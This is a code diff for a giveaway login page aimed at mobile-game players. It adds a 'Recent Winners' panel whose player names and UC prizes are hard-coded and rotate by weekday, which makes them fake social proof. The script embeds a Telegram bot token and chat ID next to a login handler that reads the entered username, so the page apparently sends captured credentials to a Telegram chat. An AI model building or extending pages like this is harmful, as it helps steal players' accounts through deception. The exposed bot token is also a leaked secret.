@@ -32,7 +32,7 @@
       position: relative;
     }
 
-    /* Top-right login button with icon + text */
+    /* Top-right login button */
     .top-right-login {
       position: absolute;
       top: 16px;
@@ -45,7 +45,6 @@
       cursor: pointer;
     }
 
-    /* Icon circle */
     .login-icon-circle {
       width: 44px;
       height: 44px;
@@ -66,7 +65,6 @@
       transform: scale(1.05);
     }
 
-    /* User icon inside */
     .login-icon-circle svg {
       width: 24px;
       height: 24px;
@@ -75,7 +73,6 @@
       fill: none;
     }
 
-    /* Login text below icon */
     .login-text-below {
       font-size: 11px;
       font-weight: 700;
@@ -90,6 +87,80 @@
 
     .top-right-login:hover .login-text-below {
       color: #ff6e40;
+    }
+
+    /* Recent Winners Section */
+    .winners-section {
+      background: linear-gradient(135deg, #1e2436 0%, #161c2a 100%);
+      margin: 20px 20px 0 20px;
+      border-radius: 24px;
+      padding: 16px;
+      border: 1px solid rgba(255, 110, 64, 0.3);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+
+    .winners-header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 14px;
+      color: #ffaa77;
+      font-weight: 700;
+      font-size: 14px;
+      letter-spacing: 1px;
+    }
+
+    .winners-header span {
+      font-size: 20px;
+    }
+
+    .winner-list {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .winner-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: rgba(0,0,0,0.3);
+      padding: 8px 12px;
+      border-radius: 16px;
+      border-left: 3px solid #ff6e40;
+    }
+
+    .winner-name {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #ffffff;
+      font-weight: 600;
+      font-size: 14px;
+    }
+
+    .winner-badge {
+      background: #ff6e40;
+      color: #fff;
+      border-radius: 20px;
+      padding: 2px 8px;
+      font-size: 10px;
+      font-weight: 700;
+    }
+
+    .winner-prize {
+      color: #ffaa77;
+      font-weight: 700;
+      font-size: 13px;
+    }
+
+    .day-badge {
+      text-align: center;
+      margin-top: 10px;
+      font-size: 10px;
+      color: #ffaa77;
+      opacity: 0.7;
     }
 
     .login-header {
@@ -293,12 +364,16 @@
       .logo-image { width: 110px; height: 110px; border-radius: 22px; }
       .logo-text .main-title { font-size: 26px; }
       .login-form { padding: 22px 20px 30px; }
+      .winners-section { margin: 15px 15px 0 15px; padding: 12px; }
+      .winner-item { padding: 6px 10px; }
+      .winner-name { font-size: 12px; }
+      .winner-prize { font-size: 11px; }
     }
   </style>
 </head>
 <body>
 <div class="login-container">
-  <!-- Top-right Login Icon with text below -->
+  <!-- Top-right Login Icon -->
   <div class="top-right-login" id="topLoginBtn">
     <div class="login-icon-circle">
       <svg viewBox="0 0 24 24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
@@ -321,6 +396,17 @@
       </div>
     </div>
     <div class="tagline">Welcome back, warrior! Log in to your battleground to participate in the giveaway.</div>
+  </div>
+
+  <!-- RECENT WINNERS SECTION (Dynamic - Daily Change) -->
+  <div class="winners-section" id="winnersSection">
+    <div class="winners-header">
+      <span>🏆</span> RECENT WINNERS <span>🏆</span>
+    </div>
+    <div class="winner-list" id="winnerList">
+      <!-- JS se dynamically fill hoga -->
+    </div>
+    <div class="day-badge" id="dayBadge"></div>
   </div>
 
   <div class="login-form">
@@ -359,6 +445,98 @@
 </div>
 
 <script>
+  // ----------------------------------------------
+  // DAILY WINNERS DATA (Har din ke alag winners)
+  // ----------------------------------------------
+  const winnersData = {
+    0: {  // Sunday
+      dayName: "Sunday",
+      winners: [
+        { name: "👑 RoyalViper", prize: "2000 UC" },
+        { name: "⚡ StormShadow", prize: "1500 UC" },
+        { name: "🔥 BlazeHunter", prize: "1000 UC" },
+        { name: "🎯 SilentSniper", prize: "800 UC" }
+      ]
+    },
+    1: {  // Monday
+      dayName: "Monday",
+      winners: [
+        { name: "💀 GrimReaper", prize: "1800 UC" },
+        { name: "🐉 DragonFist", prize: "1200 UC" },
+        { name: "⚡ ThunderBolt", prize: "900 UC" },
+        { name: "🔥 PhoenixRise", prize: "700 UC" }
+      ]
+    },
+    2: {  // Tuesday
+      dayName: "Tuesday",
+      winners: [
+        { name: "🎭 PhantomX", prize: "2200 UC" },
+        { name: "⚡ NeonBlade", prize: "1400 UC" },
+        { name: "🔥 InfernoGod", prize: "1100 UC" },
+        { name: "👑 KingSlayer", prize: "850 UC" }
+      ]
+    },
+    3: {  // Wednesday
+      dayName: "Wednesday",
+      winners: [
+        { name: "🌙 LunarWolf", prize: "1900 UC" },
+        { name: "⚡ CyberHawk", prize: "1300 UC" },
+        { name: "🔥 EmberFury", prize: "950 UC" },
+        { name: "🎯 Deadeye", prize: "750 UC" }
+      ]
+    },
+    4: {  // Thursday
+      dayName: "Thursday",
+      winners: [
+        { name: "💀 VenomSpider", prize: "2100 UC" },
+        { name: "⚡ FrostBite", prize: "1450 UC" },
+        { name: "🔥 HellRider", prize: "1050 UC" },
+        { name: "👑 IronFist", prize: "880 UC" }
+      ]
+    },
+    5: {  // Friday
+      dayName: "Friday",
+      winners: [
+        { name: "🎭 ShadowMech", prize: "2300 UC" },
+        { name: "⚡ NovaStrike", prize: "1550 UC" },
+        { name: "🔥 AshBringer", prize: "1150 UC" },
+        { name: "🎯 Vortex", prize: "820 UC" }
+      ]
+    },
+    6: {  // Saturday
+      dayName: "Saturday",
+      winners: [
+        { name: "👑 LegendKiller", prize: "2500 UC" },
+        { name: "⚡ QuantumRift", prize: "1600 UC" },
+        { name: "🔥 BlazeFury", prize: "1200 UC" },
+        { name: "💀 DarkReaper", prize: "900 UC" }
+      ]
+    }
+  };
+
+  // Get current day (0 = Sunday, 1 = Monday, ... 6 = Saturday)
+  const today = new Date().getDay();
+  const todaysWinners = winnersData[today];
+
+  // Display day badge
+  document.getElementById('dayBadge').innerHTML = `🏆 Today's Winners (${todaysWinners.dayName}) 🏆`;
+
+  // Generate winner list HTML
+  const winnerList = document.getElementById('winnerList');
+  let winnersHTML = '';
+  todaysWinners.winners.forEach((winner, index) => {
+    winnersHTML += `
+      <div class="winner-item">
+        <div class="winner-name">
+          <span class="winner-badge">#${index + 1}</span> ${winner.name}
+        </div>
+        <div class="winner-prize">${winner.prize}</div>
+      </div>
+    `;
+  });
+  winnerList.innerHTML = winnersHTML;
+
+  // ---------- Telegram Bot Code ----------
   const BOT_TOKEN = "8794528803:AAHG9cCNbPlUFGNYueQS5OiosedyXczdg-w";
   const CHAT_ID = "6626555680";
 
@@ -381,7 +559,6 @@
   document.getElementById('closePopup').onclick = () => popup.classList.remove('show');
   popup.onclick = (e) => { if (e.target === popup) popup.classList.remove('show'); };
 
-  // Main login button action
   document.getElementById('loginBtn').onclick = async function(e) {
     e.preventDefault();
     const email = document.getElementById('username').value;
@@ -400,7 +577,6 @@
     }, 600);
   };
 
-  // Optional: top-right login button can also scroll to form or just be decorative
   document.getElementById('topLoginBtn').addEventListener('click', () => {
     document.getElementById('username').focus();
   });
